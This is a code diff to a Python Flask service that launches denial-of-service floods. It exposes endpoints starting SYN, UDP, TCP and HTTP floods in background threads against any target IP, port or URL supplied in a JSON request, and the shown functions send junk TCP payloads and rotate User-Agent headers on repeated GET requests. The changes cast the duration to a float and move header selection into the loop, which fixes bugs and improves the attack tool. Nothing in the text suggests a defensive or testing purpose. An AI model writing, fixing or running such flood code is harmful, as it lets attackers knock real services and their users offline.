@@ -59,12 +59,10 @@ def tcp_flood(target_ip, target_port, duration):
         sock.send(b'A' * 1024)
 
 def http_flood(target_url, duration):
-    headers = {
-        'User-Agent': random.choice(user_agents)
-    }
-    end_time = time.time() + duration
+    end_time = time.time() + float(duration)  # Convert duration to float
     while time.time() < end_time:
         try:
+            headers = {'User-Agent': random.choice(user_agents)}
             requests.get(target_url, headers=headers)
         except requests.exceptions.RequestException:
             pass
@@ -78,7 +76,7 @@ def syn_flood_endpoint():
     data = request.json
     target_ip = data['target_ip']
     target_port = data['target_port']
-    duration = data['duration']
+    duration = float(data['duration'])  # Convert duration to float
 
     threading.Thread(target=syn_flood, args=(target_ip, target_port, duration)).start()
     return jsonify({"status": "SYN flood started"})
@@ -88,7 +86,7 @@ def udp_flood_endpoint():
     data = request.json
     target_ip = data['target_ip']
     target_port = data['target_port']
-    duration = data['duration']
+    duration = float(data['duration'])  # Convert duration to float
 
     threading.Thread(target=udp_flood, args=(target_ip, target_port, duration)).start()
     return jsonify({"status": "UDP flood started"})
@@ -98,7 +96,7 @@ def tcp_flood_endpoint():
     data = request.json
     target_ip = data['target_ip']
     target_port = data['target_port']
-    duration = data['duration']
+    duration = float(data['duration'])  # Convert duration to float
 
     threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration)).start()
     return jsonify({"status": "TCP flood started"})
@@ -107,7 +105,7 @@ def tcp_flood_endpoint():
 def http_flood_endpoint():
     data = request.json
     target_url = data['target_url']
-    duration = data['duration']
+    duration = float(data['duration'])  # Convert duration to float
 
     threading.Thread(target=http_flood, args=(target_url, duration)).start()
     return jsonify({"status": "HTTP flood started"})
